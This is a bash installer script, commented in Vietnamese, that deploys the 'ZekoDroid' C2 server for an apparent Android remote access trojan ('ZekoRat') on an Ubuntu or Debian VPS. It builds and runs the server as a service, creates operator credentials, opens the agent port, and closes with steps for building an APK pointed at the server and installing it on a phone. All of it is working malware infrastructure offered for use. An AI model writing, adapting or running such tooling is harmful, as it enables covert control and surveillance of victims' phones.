#!/usr/bin/env bash
# ZekoDroid — cài C2 server lên VPS Ubuntu/Debian chỉ bằng 1 lệnh.
#   sudo bash bootstrap.sh
# Yêu cầu: chạy trong thư mục repo (đã git clone), quyền root.
set -euo pipefail

APP_DIR=/opt/zekodroid
SVC=zekodroid
ENV_FILE=/etc/zekodroid.env
HTTP_PORT=${ZK_HTTP_PORT:-8080}
TCP_PORT=${ZK_TCP_PORT:-7878}
SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

say() { printf '\033[36m== %s\033[0m\n' "$*"; }
die() { printf '\033[31m!! %s\033[0m\n' "$*" >&2; exit 1; }

[ "$(id -u)" -eq 0 ] || die "chay bang root: sudo bash bootstrap.sh"

# ── 1. gói hệ thống ─────────────────────────────────────────────
say "cai goi he thong"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq curl ca-certificates unzip >/dev/null

# ── 2. .NET 9 SDK (nếu chưa có) ─────────────────────────────────
if ! command -v dotnet >/dev/null 2>&1; then
  say "cai .NET 9 SDK"
  curl -sSL https://dot.net/v1/dotnet-install.sh -o /tmp/dotnet-install.sh
  bash /tmp/dotnet-install.sh --channel 9.0 --install-dir /usr/share/dotnet >/dev/null
  ln -sf /usr/share/dotnet/dotnet /usr/bin/dotnet
else
  say ".NET da co: $(dotnet --version 2>/dev/null || echo '?')"
fi
export DOTNET_CLI_TELEMETRY_OPTOUT=1 DOTNET_NOLOGO=1

# ── 3. build server (self-contained linux-x64) ──────────────────
say "build server (lan dau ~1-2 phut)"
cd "$SRC_DIR/server"
dotnet publish -c Release -r linux-x64 --self-contained true --nologo -v q >/dev/null
PUBLISH="$SRC_DIR/server/bin/Release/net9.0/linux-x64/publish"
[ -f "$PUBLISH/ZekoRat.Server" ] || die "build that bai, khong thay ZekoRat.Server"
ls "$PUBLISH"/libe_sqlite3.so "$PUBLISH"/e_sqlite3.so >/dev/null 2>&1 || say "canh bao: khong thay e_sqlite3 (sqlite co the loi)"

# ── 4. user + thư mục + binary ──────────────────────────────────
say "cai dat vao $APP_DIR"
id -u zekodroid >/dev/null 2>&1 || useradd -r -s /usr/sbin/nologin -d "$APP_DIR" zekodroid
systemctl stop "$SVC" 2>/dev/null || true
mkdir -p "$APP_DIR/builder"
rm -rf "$APP_DIR/app"
cp -r "$PUBLISH" "$APP_DIR/app"
chmod +x "$APP_DIR/app/ZekoRat.Server"

# base APK cho Builder (nếu repo có)
if [ -f "$SRC_DIR/server/builder/zk_base.apk" ]; then
  cp "$SRC_DIR/server/builder/zk_base.apk" "$APP_DIR/builder/"
elif [ -f "$SRC_DIR/ZekoDroid.apk" ]; then
  cp "$SRC_DIR/ZekoDroid.apk" "$APP_DIR/builder/zk_base.apk"
fi

if [ ! -f "$ENV_FILE" ]; then
  PASS=$(head -c 18 /dev/urandom | base64 | tr -d '/+=' | head -c 12)
  PSK=$(head -c 36 /dev/urandom | base64 | tr -d '/+=' | head -c 24)
  cat > "$ENV_FILE" <<EOF
ZK_HTTP_PORT=$HTTP_PORT
ZK_TCP_PORT=$TCP_PORT
ZK_USER=admin
ZK_PASS=$PASS
ZK_PSK=$PSK
ZK_DB=$APP_DIR/zekorat.db
EOF
  chmod 600 "$ENV_FILE"
  NEW_CREDS=1
else
  say "giu nguyen $ENV_FILE"
  NEW_CREDS=0
  # shellcheck disable=SC1090
  . "$ENV_FILE"
fi
grep -q '^ZK_BASE_APK=' "$ENV_FILE" 2>/dev/null || \
  echo "ZK_BASE_APK=$APP_DIR/builder/zk_base.apk" >> "$ENV_FILE"
chown -R zekodroid:zekodroid "$APP_DIR"

# ── 5. systemd ──────────────────────────────────────────────────
say "tao systemd service"
cat > "/etc/systemd/system/$SVC.service" <<EOF
[Unit]
Description=ZekoDroid C2 server
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=zekodroid
Group=zekodroid
WorkingDirectory=$APP_DIR/app
EnvironmentFile=$ENV_FILE
ExecStart=$APP_DIR/app/ZekoRat.Server
Restart=always
RestartSec=3
LimitNOFILE=65535
NoNewPrivileges=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable "$SVC" >/dev/null 2>&1 || true
systemctl restart "$SVC"
sleep 2
systemctl is-active --quiet "$SVC" || { journalctl -u "$SVC" -n 30 --no-pager; die "service khong chay"; }

# ── 6. firewall ─────────────────────────────────────────────────
if command -v ufw >/dev/null 2>&1 && ufw status | grep -q "Status: active"; then
  say "mo port tren ufw"
  ufw allow "$HTTP_PORT"/tcp >/dev/null || true
  ufw allow "$TCP_PORT"/tcp >/dev/null || true
fi

# ── 7. in thông tin ─────────────────────────────────────────────
IP=$(curl -s -4 --max-time 5 ifconfig.me || hostname -I | awk '{print $1}')
echo
echo "=============================================================="
echo "  ZekoDroid C2 da chay"
echo "  dashboard : http://$IP:$HTTP_PORT"
echo "  agent tcp : $IP:$TCP_PORT"
echo "  service   : systemctl status $SVC   |   log: journalctl -u $SVC -f"
echo "  env       : $ENV_FILE"
if [ "${NEW_CREDS:-0}" = "1" ]; then
  echo "  user      : admin"
  echo "  pass      : $PASS"
  echo "  PSK       : $PSK"
else
  echo "  (dung user/pass/PSK cu trong $ENV_FILE)"
fi
echo "--------------------------------------------------------------"
echo "  Buoc cuoi: vao panel -> nut 'Builder' -> nhap $IP port $TCP_PORT"
echo "             -> Build & tai APK -> cai len dien thoai"
echo "=============================================================="
